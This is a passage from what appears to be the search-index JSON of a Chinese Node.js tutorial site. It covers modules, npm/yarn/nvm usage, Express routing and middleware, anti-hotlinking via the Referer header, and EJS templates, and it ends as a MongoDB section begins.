模块化\",\"其中拆分出的每个文件就是一个模块，模块的内部数据是私有的，不过模块可以暴露内部数据以便其他模块使用\"]},{\"header\":\"1.2 模块化项目\",\"slug\":\"_1-2-模块化项目\",\"contents\":[\"编码时是按照模块一个一个编码的， 整个项目就是一个模块化的项目\"]},{\"header\":\"1.3 模块化好处\",\"slug\":\"_1-3-模块化好处\",\"contents\":[\"下面是模块化的一些好处：\",\"防止命名冲突\",\"高复用性\",\"高维护性\"]},{\"header\":\"2. 模块导出与导入\",\"slug\":\"_2-模块导出与导入\",\"contents\":[\"因为模块内的属性和函数都是私有的，如果对外使用，需要使用标准语法导出和导入才可以\"]},{\"header\":\"2.1 CommonJS标准\",\"slug\":\"_2-1-commonjs标准\",\"contents\":[\"导出语法：\",\"module.exports = { 对外属性名: 模块内私有变量 } \",\"导入语法：\",\"const 变量名 = require('模块名或路径') // Node.js 环境内置模块直接写模块名（例如：fs，path，http） // 自定义模块：写模块文件路径（例如：./utils.js) \",\"变量名的值接收的就是目标模块导出的对象\"]},{\"header\":\"2.2 ECMAScript标准\",\"slug\":\"_2-2-ecmascript标准\",\"contents\":[\"CommonJS 规范是 Node.js 环境中默认的，后来官方推出 ECMAScript 标准语法\"]},{\"header\":\"2.2.1 默认导出和导入\",\"slug\":\"_2-2-1-默认导出和导入\",\"contents\":[\"导出语法：\",\"export default { 对外属性名: 模块内私有变量 } \",\"导入语法：\",\"import 变量名 from '模块名或路径' \",\"变量名的值接收的就是目标模块导出的对象\",\"注意：Node.js 默认只支持 CommonJS 标准语法，如果想要在当前项目环境下使用 ECMAScript 标准语法，请新建 package.json 文件设置type: 'module' 来进行设置\",\"{ “type”: \\\"module\\\" } \"]},{\"header\":\"2.2.2 命名导出和导入\",\"slug\":\"_2-2-2-命名导出和导入\",\"contents\":[\"命名导出语法：\",\"export 修饰定义语句 \",\"命名导入语法：\",\"import { 同名变量 } from '模块名或路径' \",\"注意：同名变量指的是模块内导出的变量名\",\"与默认导出如何选择：\",\"按需加载，使用命名导出和导入\",\"全部加载，使用默认导出和导入\"]}]},\"/front-end/nodejs-notes/07-NodeJS-%E5%8C%85%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7.html\":{\"title\":\"包管理工具\",\"contents\":[{\"header\":\"1. 包的概念\",\"slug\":\"_1-包的概念\",\"contents\":[\"包的英文单词是 package ，代表了一组特定功能的源码集合\",\"将模块，代码，其他资料整合成一个文件夹，这个文件夹就叫包\",\"包分类：\",\"项目包：主要用于编写项目和业务逻辑\",\"软件包：封装工具和方法进行使用\",\"包要求：根目录中，必须有 package.json 文件（记录包的清单信息）\",\"package.json\",\"{ \\\"name\\\": \\\"1-npm\\\", #包的名字 \\\"version\\\": \\\"1.0.0\\\", #包的版本 \\\"description\\\": \\\"\\\", #包的描述 \\\"main\\\": \\\"index.js\\\", #包的入口文件 \\\"scripts\\\": { #脚本配置 \\\"test\\\": \\\"echo \\\\\\\"Error: no test specified\\\\\\\" && exit 1\\\" }, \\\"author\\\": \\\"\\\", #作者 \\\"license\\\": \\\"ISC\\\" #开源证书 } \",\"包使用：在引入一个包文件夹到代码中，默认引入的是包文件节下的 index.js 模块文件里导出的对象，如果没有index.js 文件，则会引入 package.json 里 main 属性指定的文件模块导出的对象\"]},{\"header\":\"2. 包管理工具\",\"slug\":\"_2-包管理工具\",\"contents\":[\"管理包的应用软件，可以对包进行 下载安装 ， 更新 ， 删除， 上传等操作\",\"借助包管理工具，可以快速开发项目，提升开发效率\",\"包管理工具是一个通用的概念，很多编程语言都有包管理工具\",\"前端常用的包管理工具：\",\"npm\",\"yarn\",\"cnpm\"]},{\"header\":\"3. npm\",\"slug\":\"_3-npm\",\"contents\":[\"npm 全称 Node Package Manager ，翻译为中文意思是『Node 的包管理工具』\",\"npm 是 node.js 官方内置的包管理工具\"]},{\"header\":\"3.1 npm的安装\",\"slug\":\"_3-1-npm的安装\",\"contents\":[\"node.js 在安装时会 自动安装 npm ，所以如果你已经安装了 node.js，可以直接使用 npm\",\"可以通过 npm -v 查看版本号测试，如果显示版本号说明安装成功，反之安装失败\"]},{\"header\":\"3.2 基本使用\",\"slug\":\"_3-2-基本使用\",\"contents\":[]},{\"header\":\"3.2.1 初始化\",\"slug\":\"_3-2-1-初始化\",\"contents\":[\"创建一个空目录，然后以此目录作为工作目录启动命令行工具，执行 npm init\",\"npm init 命令的作用是将文件夹初始化为一个『包』，交互式创建package.json文件\",\"package.json 是包的配置文件，每个包都必须要有 package.json\",\"初始化的过程中还有一些注意事项：\",\"package name (包名) 不能使用中文、大写，默认值是文件夹的名称，所以文件夹名称也不能使用中文和大写\",\"version (版本号)要求 x.x.x 的形式定义，x 必须是数字，默认值是 1.0.0\",\"ISC 证书与 MIT 证书功能上是相同的\",\"package.json 可以手动创建与修改\",\"可以使用 npm init -y 或者 npm init --yes 极速创建 package.json\"]},{\"header\":\"3.2.2 搜索包\",\"slug\":\"_3-2-2-搜索包\",\"contents\":[\"搜索包的方式有两种\",\"命令行：npm s/search 关键字\",\"网站搜索：npm\"]},{\"header\":\"3.2.3 下载安装包\",\"slug\":\"_3-2-3-下载安装包\",\"contents\":[\"我们可以通过 npm install 或 npm i 命令安装包\",\"# 语法 npm install <包名> npm i <包名> # 示例 npm install uniq npm i uniq \",\"运行之后文件夹下会增加两个资源\",\"node_modules 文件夹存放下载的包\",\"package-lock.json 包的锁文件，用来锁定包的版本\",\"安装 uniq 之后， uniq 就是当前这个包的一个 依赖包 ，有时会简称为 依赖\",\"比如我们创建一个包名字为 A，A 中安装了包名字是 B，我们就说B 是 A 的一个依赖包，也会说A 依赖 B\"]},{\"header\":\"3.2.4 require导入npm包基本流程\",\"slug\":\"_3-2-4-require导入npm包基本流程\",\"contents\":[\"在当前文件夹下 node_modules 中寻找同名的文件夹\",\"在上级目录中下的 node_modules 中寻找同名的文件夹，直至找到磁盘根目录\"]},{\"header\":\"3.3 生产环境与开发环境\",\"slug\":\"_3-3-生产环境与开发环境\",\"contents\":[\"开发环境 是程序员专门用来写代码的环境，一般是指程序员的电脑，开发环境的项目一般只能程序员自己访问\",\"生产环境 是项目代码正式运行的环境，一般是指正式的服务器电脑，生产环境的项目一般每个客户都可以访问\"]},{\"header\":\"3.4 生产依赖与开发依赖\",\"slug\":\"_3-4-生产依赖与开发依赖\",\"contents\":[\"我们可以在安装时设置选项来区分依赖的类型，目前分为两类：\",\"类型\",\"命令\",\"补充\",\"生产依赖\",\"npm i -S <包名>npm i --save <包名>\",\"-S 等效于 --save，-S 是默认选项包信息保存在 package.json 中 dependencies 属性里\",\"开发依赖\",\"npm i -D <包名>npm i --save-dev <包名>\",\"-D 等效于 --save-dev包信息保存在 package.json 中 devDependencies 属性里\",\"举个例子方便大家理解，比如说做蛋炒饭需要大米，油，葱，鸡蛋，锅，煤气，铲子等\",\"其中锅， 煤气， 铲子属于开发依赖，只在制作阶段使用\",\"而 大米， 油， 葱， 鸡蛋属于生产依赖，在制作与最终食用都会用到\",\"所以 开发依赖 是只在开发阶段使用的依赖包，而 生产依赖 是开发阶段和最终上线运行阶段都用到的依赖包\"]},{\"header\":\"3.5 全局安装\",\"slug\":\"_3-5-全局安装\",\"contents\":[\"我们可以执行安装选项 -g 进行全局安装\",\"例：\",\"npm i -g nodemon \",\"全局安装完成之后就可以在命令行的任何位置运行 nodemon 命令\",\"该命令的作用是自动重启 node 应用程序\",\"说明：\",\"全局安装的命令不受工作目录位置影响\",\"可以通过 npm root -g 可以查看全局安装包的位置\",\"不是所有的包都适合全局安装，只有全局类的工具才适合，可以通过查看包的官方文档来确定安装方式\"]},{\"header\":\"3.5.1 修改windows执行策略\",\"slug\":\"_3-5-1-修改windows执行策略\",\"contents\":[\"windows默认不允许npm全局命令执行脚本文件，所以需要修改执行策略\",\"以管理员身份打开 powershell 命令行\",\"键入命令 set-ExecutionPolicy remoteSigned\",\"键入A然后敲回车\",\"如果不生效，可以尝试重启 vscode\"]},{\"header\":\"3.5.2 环境变量Path\",\"slug\":\"_3-5-2-环境变量path\",\"contents\":[\"Path 是操作系统的一个环境变量，可以设置一些文件夹的路径，在当前工作目录下找不到可执行文件时，就会在环境变量 Path 的目录中挨个的查找，如果找到则执行，如果没有找到就会报错\",\"补充说明：\",\"如果希望某个程序在任何工作目录下都能正常运行，就应该将该程序的所在目录配置到环境 变量Path中\",\"windows下查找命令的所在位置 \",\"cmd命令行中执行where nodemon\",\"powershell命令行执行 get-command nodemon\"]},{\"header\":\"3.6 安装包依赖\",\"slug\":\"_3-6-安装包依赖\",\"contents\":[\"在项目协作中有一个常用的命令就是 npm i，通过该命令可以依据 package.json 和 package-lock.json 的依赖声明安装项目依赖\",\"npm i npm install \",\"node_modules 文件夹大多数情况都不会存入版本库\"]},{\"header\":\"3.7 安装指定版本的包\",\"slug\":\"_3-7-安装指定版本的包\",\"contents\":[\"项目中可能会遇到版本不匹配的情况，有时就需要安装指定版本的包，可以使用下面的命令\",\"## 命令 npm i <包名@版本号> ## 示例 npm i jquery@1.11.2 \"]},{\"header\":\"3.8 删除依赖\",\"slug\":\"_3-8-删除依赖\",\"contents\":[\"项目中可能需要删除某些不需要的包，可以使用下面的命令\",\"## 局部删除 npm remove <包名> npm r <包名> ## 全局删除 npm remove -g <包名> \"]},{\"header\":\"3.9 配置命令别名\",\"slug\":\"_3-9-配置命令别名\",\"contents\":[\"通过配置命令别名可以更简单的执行命令\",\"配置 package.json 中的 scripts 属性\",\"{ . . . \\\"scripts\\\": { \\\"server\\\": \\\"node server.js\\\", \\\"start\\\": \\\"node index.js\\\", }, . . } \",\"配置完成之后，可以使用别名执行命令\",\"npm run server npm run start \",\"不过 start 别名比较特别，使用时可以省略 run\",\"npm start \",\"补充说明：\",\"npm start 是项目中常用的一个命令，一般用来启动项目\",\"npm run 有自动向上级目录查找的特性，跟 require 函数也一样\",\"对于陌生的项目，我们可以通过查看 scripts 属性来参考项目的一些操作\"]},{\"header\":\"4. cnpm\",\"slug\":\"_4-cnpm\",\"contents\":[\"cnpm 是一个淘宝构建的npmjs.com的完整镜像，也称为淘宝镜像\",\"官网：npmmirror 镜像站\",\"cnpm 服务部署在国内阿里云服务器上，可以提高包的下载速度\",\"官方也提供了一个全局工具包 cnpm ，操作命令与 npm 大体相同\"]},{\"header\":\"4.1 cnpm的安装\",\"slug\":\"_4-1-cnpm的安装\",\"contents\":[\"我们可以通过 npm 来安装 cnpm 工具\",\"npm install -g cnpm --registry=https://registry.npmmirror.com \"]},{\"header\":\"4.2 操作命令\",\"slug\":\"_4-2-操作命令\",\"contents\":[\"功能\",\"命令\",\"初始化\",\"cnpm init / cnpm init\",\"安装包\",\"cnpm i <包名>cnpm i -S <包名>cnpm i -D <包名>cnpm i -g <包名>\",\"安装项目依赖\",\"cnpm i\",\"删除\",\"cnpm r <包名>\"]},{\"header\":\"4.3 npm配置淘宝镜像\",\"slug\":\"_4-3-npm配置淘宝镜像\",\"contents\":[\"用 npm 也可以使用淘宝镜像，配置的方式有两种：\",\"直接配置\",\"工具配置\"]},{\"header\":\"4.3.1 直接配置\",\"slug\":\"_4-3-1-直接配置\",\"contents\":[\"执行如下命令即可完成配置\",\"npm config set registry https://registry.npmmirror.com/ \"]},{\"header\":\"4.3.2 工具配置\",\"slug\":\"_4-3-2-工具配置\",\"contents\":[\"使用 nrm 配置 npm 的镜像地址npm registry manager\",\"安装 nrm\",\"npm i -g nrm \",\"修改镜像\",\"nrm use taobao \",\"检查是否配置成功（选做）\",\"npm config list \",\"检查 registry 地址是否为https://registry.npmmirror.com/, 如果是则表明成功\",\"补充说明：\",\"建议使用第二种方式进行镜像配置，因为后续修改起来会比较方便\",\"虽然 cnpm 可以提高速度，但是 npm 也可以通过淘宝镜像进行加速，所以npm 的使用率还是高于 cnpm\"]},{\"header\":\"5. yarn\",\"slug\":\"_5-yarn\",\"contents\":[\"yarn 是由 Facebook 在 2016 年推出的新的 Javascript 包管理工具\",\"官网：Yarn - Package Manager\",\"yarn 官方宣称的一些特点\",\"速度超快：yarn 缓存了每个下载过的包，所以再次使用时无需重复下载。 同时利用并行下载以最大化资源利用率，因此安装速度更快\",\"超级安全：在执行代码之前，yarn 会通过算法校验每个安装包的完整性\",\"超级可靠：使用详细、简洁的锁文件格式和明确的安装算法，yarn 能够保证在不同系统上无差异的工作\"]},{\"header\":\"5.1 yarn的安装\",\"slug\":\"_5-1-yarn的安装\",\"contents\":[\"我们可以使用 npm 安装 yarn\",\"npm i -g yarn \"]},{\"header\":\"5.2 操作命令\",\"slug\":\"_5-2-操作命令\",\"contents\":[\"功能\",\"命令\",\"初始化\",\"yarn init / yarn init -y\",\"安装包\",\"yarn add <包名> 生产依赖yarn add <包名> --dev 开发依赖yarn global add <包名> 全局安装\",\"删除包\",\"yarn remove <包名> 删除项目依赖包yarn global remove <包名> 全局删除包\",\"安装项目依赖\",\"yarn\",\"运行命令别名\",\"yarn <别名> # 不需要添加 run\",\"思考题：\",\"这里有个小问题就是全局安装的包不可用，yarn 全局安装包的位置可以通过 yarn global bin来查看\",\"那你有没有办法使 yarn 全局安装的包能够正常运行？\",\"配置 path 环境\"]},{\"header\":\"5.3 yarn配置淘宝镜像\",\"slug\":\"_5-3-yarn配置淘宝镜像\",\"contents\":[\"可以通过如下命令配置淘宝镜像\",\"yarn config set registry https://registry.npmmirror.com/ \",\"可以通过 yarn config list 查看 yarn 的配置项\"]},{\"header\":\"5.4 npm和yarn选择\",\"slug\":\"_5-4-npm和yarn选择\",\"contents\":[\"大家可以根据不同的场景进行选择\",\"个人项目\",\"如果是个人项目，哪个工具都可以，可以根据自己的喜好来选择\",\"公司项目 如果是公司要根据项目代码来选择，可以通过锁文件判断项目的包管理工具\",\"npm 的锁文件为 package-lock.json\",\"yarn 的锁文件为 yarn.lock\",\"包管理工具不要混着用，切记，切记，切记\"]},{\"header\":\"6. 管理发布包\",\"slug\":\"_6-管理发布包\",\"contents\":[]},{\"header\":\"6.1 创建与发布\",\"slug\":\"_6-1-创建与发布\",\"contents\":[\"我们可以将自己开发的工具包发布到 npm 服务上，方便自己和其他开发者使用，操作步骤如下：\",\"创建文件夹，并创建文件 index.js， 在文件中声明函数，使用 module.exports 暴露\",\"npm 初始化工具包，package.json填写包的信息 (包的名字是唯一的)\",\"注册账号：npm | Sign Up\",\"激活账号（一定要激活账号）\",\"修改为官方的官方镜像 (命令行中运行 nrm use npm )\",\"命令行下 npm login 填写相关用户信息\",\"命令行下 npm publish 提交包\"]},{\"header\":\"6.2 更新包\",\"slug\":\"_6-2-更新包\",\"contents\":[\"后续可以对自己发布的包进行更新，操作步骤：\",\"更新包中的代码\",\"测试代码是否可用\",\"修改 package.json 中的版本号\",\"发布更新\",\"npm publish \"]},{\"header\":\"6.3 删除包\",\"slug\":\"_6-3-删除包\",\"contents\":[\"执行如下命令删除包\",\"npm unpublish --force \",\"删除包需要满足一定的条件：\",\"你是包的作者\",\"发布小于 24 小时\",\"大于 24 小时后，没有其他包依赖，并且每周小于 300 下载量，并且只有一个维护者\"]},{\"header\":\"7. 扩展内容\",\"slug\":\"_7-扩展内容\",\"contents\":[\"在很多语言中都有包管理工具，比如：\",\"语言\",\"包管理工具\",\"PHP\",\"composer\",\"Python\",\"pip\",\"Java\",\"maven\",\"Go\",\"go mod\",\"JavaScript\",\"npm/yarn/cnpm/other\",\"Ruby\",\"rubyGems\",\"除了编程语言领域有包管理工具之外，操作系统层面也存在包管理工具，不过这个包指的是软件包\",\"操作系统\",\"包管理工具\",\"网址\",\"Centos\",\"yum\",\"https://packages.debian.org/stable/\",\"Ubuntu\",\"apt\",\"https://packages.ubuntu.com/\",\"MacOS\",\"homebrew\",\"https://brew.sh/\",\"Windows\",\"chocolatey\",\"https://chocolatey.org/\"]}]},\"/front-end/nodejs-notes/08-NodeJS-nvm.html\":{\"title\":\"nvm\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"nvm 全称 Node Version Manager 顾名思义它是用来管理 node 版本的工具，方便切换不同版本的Node.js\",\"nvm 的使用非常的简单，跟 npm 的使用方法类似\"]},{\"header\":\"1. 下载安装\",\"slug\":\"_1-下载安装\",\"contents\":[\"首先先下载 nvm，下载地址：nvm-windows\",\"选择 nvm-setup.exe 下载即可\"]},{\"header\":\"2. 常用命令\",\"slug\":\"_2-常用命令\",\"contents\":[\"命令\",\"说明\",\"nvm list available\",\"显示所有可以下载的 Node.js 版本\",\"nvm list\",\"显示已安装的版本\",\"nvm install 18.12.1\",\"安装 18.12.1 版本的 Node.js\",\"nvm install latest\",\"安装最新版的 Node.js\",\"nvm uninstall 18.12.1\",\"删除某个版本的 Node.js\",\"nvm use 18.12.1\",\"切换 18.12.1 的 Node.js\"]}]},\"/front-end/nodejs-notes/09-NodeJS-express%E6%A1%86%E6%9E%B6.html\":{\"title\":\"express框架\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"express 是一个基于 Node.js 平台的极简、灵活的 WEB 应用开发框架，官方网址：Express 中文网\",\"简单来说，express 是一个封装好的工具包，封装了很多功能，便于我们开发 WEB 应用(HTTP服务)\"]},{\"header\":\"1. express使用\",\"slug\":\"_1-express使用\",\"contents\":[]},{\"header\":\"1.1 express下载\",\"slug\":\"_1-1-express下载\",\"contents\":[\"express 本身是一个 npm 包，所以可以通过 npm 安装\",\"npm init npm i express \"]},{\"header\":\"1.2 express初体验\",\"slug\":\"_1-2-express初体验\",\"contents\":[\"可以按照这个步骤进行操作：\",\"创建JS文件，键入如下代码：\",\"//1. 导入 express const express = require('express') //2. 创建应用对象 const app = express() //3. 创建路由规则 app.get('/home', (req, res) => { res.end('hello express server') }) //4. 监听端口 启动服务 app.listen(3000, () =>{ console.log('服务已经启动, 端口监听为 3000...') }) \",\"命令行下执行该脚本\",\"1. node <文件名> # 或者 nodemon <文件名> \",\"然后在浏览器就可以访问http://127.0.0.1:3000/home\"]},{\"header\":\"2. express路由\",\"slug\":\"_2-express路由\",\"contents\":[]},{\"header\":\"2.1 什么是路由\",\"slug\":\"_2-1-什么是路由\",\"contents\":[\"官方定义：路由确定了应用程序如何响应客户端对特定端点的请求\"]},{\"header\":\"2.2 路由的使用\",\"slug\":\"_2-2-路由的使用\",\"contents\":[\"一个路由由请求方法、路径、回调函数组成\",\"express 中提供了一系列方法，可以很方便的使用路由，使用格式如下：\",\"app.<method>(path，callback) // app是express对象的一个实例，method是一个HTTP请求方法，path是服务器上的路径，callback是当路由匹配时要执行的函数 \",\"代码示例：\",\"//导入 express const express = require('express') //创建应用对象 const app = express() //创建 get 路由 app.get('/home', (req, res) => { res.send('网站首页') }) //首页路由 app.get('/', (req,res) => { res.send('我才是真正的首页') }) //创建 post 路由 app.post('/login', (req, res) => { res.send('登录成功') }) //匹配所有的请求方法 app.all('/search', (req, res) => { res.send('1 秒钟为您找到相关结果约 100,000,000 个') }) //自定义 404 路由 app.all(\\\"*\\\", (req, res) => { res.send('<h1>404 Not Found</h1>') }) //监听端口 启动服务 app.listen(3000, () =>{ console.log('服务已经启动, 端口监听为 3000') }) \",\"路由路径和请求方法一起定义了请求的端点，它可以是字符串、字符串模式或者正则表达式\",\"// 匹配根路径的请求 app.get('/', function (req, res) { res.send('root') }) // 匹配 /about 路径的请求 app.get('/about', function (req, res) { res.send('about') }) // 匹配 /random.text 路径的请求 app.get('/random.text', function (req, res) { res.send('random.text') }) \",\"使用字符串模式的路由路径示例：\",\"// 匹配 acd 和 abcd app.get('/ab?cd', function(req, res) { res.send('ab?cd') }) // ? 表示 b 可选，出现 0 次或 1 次 // 匹配 /ab/****** app.get('/ab/:id', function(req, res) { res.send('aaaaaaa') }) // :id 表示动态路由参数，可以是任意字符串 // 匹配 abcd、abbcd、abbbcd等 app.get('/ab+cd', function(req, res) { res.send('ab+cd') }) // + 表示 b 至少出现 1 次或更多次 // 匹配 abcd、abxcd、abRABDOMcd、ab123cd等 app.get('/ab*cd', function(req, res) { res.send('ab*cd') }) // * 表示匹配任意数量（包括 0 个）的字符，即可有可无 // 匹配 /abe 和 /abcde app.get('/ab(cd)?e', function(req, res) { res.send('ab(cd)?e') }) // ()? 表示括号内的内容可选，即可以出现，也可以不出现 \",\"使用正则表达式的路由路径示例：\",\"// 匹配任何路径中含有 a 的路径： app.get(/a/, function(req, res) { res.send('/a/') }) // 匹配 butterfly、dragonfly，不匹配 butterflyman、dragonfly man等 app.get(/.*fly$/, function(req, res) { res.send('/.*fly$/') }) \"]},{\"header\":\"3. 获取请求参数\",\"slug\":\"_3-获取请求参数\",\"contents\":[\"express 框架封装了一些 API 来方便获取请求报文中的数据，并且兼容原生 HTTP 模块的获取方式\",\"//导入 express const express = require('express') //创建应用对象 const app = express() //获取请求的路由规则 app.get('/request', (req, res) => { // 1. 获取报文的方式与原生 HTTP 获取方式是兼容的 console.log(req.method) console.log(req.url) console.log(req.httpVersion) console.log(req.headers) // 2. express 独有的获取报文的方式 // 获取路径 console.log(req.path) //获取查询字符串 console.log(req.query) // 『相对重要』对象形式返回所有的查询字符串 // 获取指定的请求头 console.log(req.get('host')) res.send('请求报文的获取') }) //启动服务 app.listen(3000, () => { console.log('启动成功....') }) \",\"获取路由参数：\",\"路由参数指的是URL 路径中的参数（数据）\",\"app.get('/:id.html', (req, res) => { res.send('商品详情, 商品 id 为' + req.params.id) }) \"]},{\"header\":\"4. express响应设置\",\"slug\":\"_4-express响应设置\",\"contents\":[\"express 框架封装了一些 API 来方便给客户端响应数据，并且兼容原生 HTTP 模块的获取方式\",\"//获取请求的路由规则 app.get(\\\"/response\\\", (req, res) => { //1. express 中设置响应的方式兼容 HTTP 模块的方式 res.statusCode = 404 res.statusMessage = 'xxx' res.setHeader('abc','xyz') res.write('响应体') res.end('xxx') //2. express 的响应方法 res.status(500) //设置响应状态码 res.set('xxx','yyy')//设置响应头 res.send('中文响应不乱码')//设置响应体 //连贯操作 res.status(404).set('xxx','yyy').send('你好朋友') //3. 其他响应 res.redirect('http://atguigu.com')//重定向 res.download('./package.json')//下载响应 res.json()//响应 JSON res.sendFile(__dirname + '/home.html') //响应文件内容 }) \"]},{\"header\":\"5. express中间件\",\"slug\":\"_5-express中间件\",\"contents\":[\"中间件（Middleware）本质是一个回调函数\",\"中间件函数可以像路由回调一样访问请求对象（request）、响应对象（response）\",\"中间件的作用就是使用函数封装公共操作，简化代码\",\"中间件的类型：\",\"全局中间件\",\"路由中间件\"]},{\"header\":\"5.1 全局中间件\",\"slug\":\"_5-1-全局中间件\",\"contents\":[\"每一个请求到达服务端之后都会执行全局中间件函数\",\"声明中间件函数：\",\"let recordMiddleware = function(request,response,next){ //实现功能代码 //..... //执行next函数(当如果希望执行完中间件函数之后，仍然继续执行路由中的回调函数，必须调用next) next() } \",\"应用中间件：\",\"app.use(recordMiddleware) \",\"声明时可以直接将匿名函数传递给use\",\"app.use(function (request, response, next) { console.log('定义第一个中间件') next() }) \",\"express 允许使用 app.use() 定义多个全局中间件\",\"app.use(function (request, response, next) { console.log('定义第一个中间件') next() }) app.use(function (request, response, next) { console.log('定义第二个中间件') next() }) \"]},{\"header\":\"5.2 路由中间件\",\"slug\":\"_5-2-路由中间件\",\"contents\":[\"如果只需要对某一些路由进行功能封装，则就需要路由中间件\",\"使用格式如下：\",\"app.get('/路径',中间件函数,(request,response)=>{ }) app.get('/路径',中间件函数1,中间件函数2,(request,response)=>{ }) \"]},{\"header\":\"5.3 静态资源中间件\",\"slug\":\"_5-3-静态资源中间件\",\"contents\":[\"express内置处理静态资源的中间件\",\"//引入express框架 const express = require('express') //创建服务对象 const app = express() //静态资源中间件的设置，将当前文件夹下的public目录作为网站的根目录 app.use(express.static('./public')) //当然这个目录中都是一些静态资源 //如果访问的内容经常变化，还是需要设置路由 //但是，在这里有一个问题，如果public目录下有index.html文件，单独也有index.html的路由 //则谁书写在前，优先执行谁 app.get('/index.html',(request,response)=>{ respsonse.send('首页') }) //监听端口 app.listen(3000,()=>{ console.log('3000 端口启动....') }); \",\"注意事项:\",\"index.html 文件为默认打开的资源\",\"如果静态资源与路由规则同时匹配，谁先匹配谁就响应\",\"路由响应动态资源，静态资源中间件响应静态资源\"]},{\"header\":\"5.4 第三方中间件\",\"slug\":\"_5-4-第三方中间件\",\"contents\":[\"如：express 可以使用 body-parser 包处理请求体\",\"安装\",\"npm i body-parser \",\"导入 body-parser 包\",\"const bodyParser = require('body-parser') \",\"获取中间件函数\",\"//处理 querystring 格式的请求体 let urlParser = bodyParser.urlencoded({extended:false})) //处理 JSON 格式的请求体 let jsonParser = bodyParser.json() \",\"设置路由中间件，然后使用 request.body 来获取请求体数据\",\"app.post('/login', urlParser, (request,response)=>{ //获取请求体数据 console.log(request.body) response.send('获取请求体数据') }); \",\"注意：现在你已经可以抛弃 body-parser 模块，因为 Express 自从 4.16.0 版本开始，内置了 body 解析\",\"使用方法:\",\"const express = require('express') const app = express() // 解析 JSON 格式的请求体的中间件 app.use(express.json()) // 解析 querystring 格式请求体的中间件 app.use(express.urlencoded({ extended: false })) \"]},{\"header\":\"6. 防盗链\",\"slug\":\"_6-防盗链\",\"contents\":[\"防盗链（Referer 策略）是一种常见的网站保护方法，它可以确保只有从特定来源访问网站的用户才能访问该网站或资源。这种策略通常用于保护版权内容或限制特定访问者使用某些功能\",\"比如，如果你在一个网站上嵌入了一个视频资源，你可以通过设置防盗链，只允许从你的网站上引用该视频资源。当其他网站试图直接链接到该视频时，会被拒绝访问\",\"实现防盗链的方法有很多种，其中一种简单的方法是检查 HTTP 请求头部中的 Referer 字段，此字段标识了当前请求的来源 URL。如果当前请求的来源不是你指定的网站，就可以拒绝该请求，返回一个错误页面或者其它提示信息\",\"可以在中间件中实现：\",\"//导入 express const express = require('express'); //创建应用对象 const app = express() //声明中间件 app.use((req, res, next) => { //检测请求头中的 referer 是否为 127.0.0.1 //获取 referer let referer = req.get('referer') if(referer){ //实例化 let url = new URL(referer) //获取 hostname let hostname = url.hostname //判断 if(hostname !== '127.0.0.1'){ //响应 404 res.status(404).send('<h1>404 Not Found</h1>') return } } next() }) //静态资源中间件设置 app.use(express.static(__dirname + '/public')) //监听端口, 启动服务 app.listen(3000, () => { console.log('服务已经启动, 端口 3000 正在监听中....') }) \"]},{\"header\":\"7. Router\",\"slug\":\"_7-router\",\"contents\":[\"express 中的 Router 是一个完整的中间件和路由系统，可以看做是一个小型的 app 对象\",\"Roter可以对路由进行模块化，更好的管理路由\",\"基本使用：\",\"创建独立的 JS 文件（homeRouter.js）\",\"//1. 导入 express const express = require('express') //2. 创建路由器对象 const router = express.Router() //3. 在 router 对象身上添加路由 router.get('/', (req, res) => { res.send('首页') }) router.get('/cart', (req, res) => { res.send('购物车') }) //4. 暴露 module.exports = router \",\"主文件中使用\",\"const express = require('express') const app = express() //5.引入子路由文件 const homeRouter = require('./routes/homeRouter') //6.设置和使用中间件 app.use(homeRouter) app.listen(3000,()=>{ console.log('3000 端口启动....') }) \"]},{\"header\":\"8. EJS模板引擎\",\"slug\":\"_8-ejs模板引擎\",\"contents\":[]},{\"header\":\"8.1 模板引擎\",\"slug\":\"_8-1-模板引擎\",\"contents\":[\"模板引擎是分离用户界面和业务数据的一种技术\"]},{\"header\":\"8.1 EJS\",\"slug\":\"_8-1-ejs\",\"contents\":[\"EJS是一个高效的 Javascript 的模板引擎\",\"官网：EJS \",\"中文站：EJS中文文档\"]},{\"header\":\"8.2 EJS初体验\",\"slug\":\"_8-2-ejs初体验\",\"contents\":[\"下载安装EJS：\",\"npm i ejs --save \",\"代码示例：\",\"//1.引入ejs const ejs = require('ejs') //2.定义数据 let person = ['张三','李四','王二麻子'] //3.ejs解析模板返回结构 //<%= %> 是ejs解析内容的标记，作用是输出当前表达式的执行结构 //\\\"<%= %>\\\"可以直接输出变量或表达式的值，变量或表达式的值将作为一个字符串在浏览器中输出 let html = ejs.render('<%= person.join(\\\",\\\") %>', {person:person}) //4.输出结果 console.log(html) \",\"命令行下运行\"]},{\"header\":\"8.3 EJS常用语法\",\"slug\":\"_8-3-ejs常用语法\",\"contents\":[\"执行JS代码：\",\"<% code %> \",\"输出转义的数据到模板上：\",\"<%= code %> \",\"输出非转义的数据到模板上：\",\"<%- code %> \"]},{\"header\":\"8.4 在express中使用ejs\",\"slug\":\"_8-4-在express中使用ejs\",\"contents\":[\"// 导入 express const express = require('express') const path = require('path') // 创建应用对象 const app = express() // 1. 设置模板引擎 app.set('view engine', 'ejs') // 2. 设置模板文件的存放位置 // 模板文件: 具有模板语法内容的文件 app.set('views', path.resolve(__dirname, './views')) // 创建路由 app.get('/home', (req, res) => { // 3. render 响应 // res.render('模板的文件名','数据') let title = '欢迎学习express' res.render('home', { title }) // 4. 创建模板文件 // 如下面文件 views/home.ejs }) // 监听端口，启动服务 app.listen(3000, () => { console.log('服务器已启动~~~~') }) \",\"views/home.ejs\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\"> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\"> <title>Document</title> </head> <body> <h2> <%=title %> </h2> </body> </html> \"]},{\"header\":\"9. Express应用程序生成器\",\"slug\":\"_9-express应用程序生成器\",\"contents\":[\"通过应用生成器工具 express-generator 可以快速创建一个应用的骨架\",\"详见：Express 应用程序生成器 - Express 中文文档\"]}]},\"/front-end/nodejs-notes/10-NodeJS-MongoDB.html\":{\"title\":\"MongoDB\",\"contents\":[{\"header\":\"1. 简介\",\"slug\":\"_1-简介\",\"contents\":[]},{\"header\":\"1.1 Mongodb是什么\",\"slug\":\"_1-1-mongodb是什么\",\"contents\":[\"MongoDB 